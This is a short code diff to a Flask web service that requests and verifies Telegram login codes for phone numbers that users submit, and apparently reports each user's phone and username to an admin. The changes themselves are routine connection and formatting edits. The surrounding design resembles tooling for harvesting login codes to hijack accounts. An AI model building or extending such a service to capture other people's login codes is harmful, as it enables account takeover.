@@ -82,9 +82,9 @@ def send_code():
             )
             await client.connect()
             sent = await client.send_code_request(phone)
+            await client.disconnect()
 
             pending[phone] = {
-                "client": client,
                 "hash": sent.phone_code_hash
             }
 
@@ -93,13 +93,12 @@ def send_code():
 
     except FloodWaitError as e:
         return jsonify({"status": "flood_wait", "seconds": e.seconds})
-
     except PhoneNumberInvalidError:
         return jsonify({"status": "phone_invalid"})
-
     except Exception as e:
         print("SEND CODE ERROR:", e)
         return jsonify({"status": "error"})
+
 
 
 @app.route("/verify_code", methods=["POST"])
@@ -202,6 +201,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
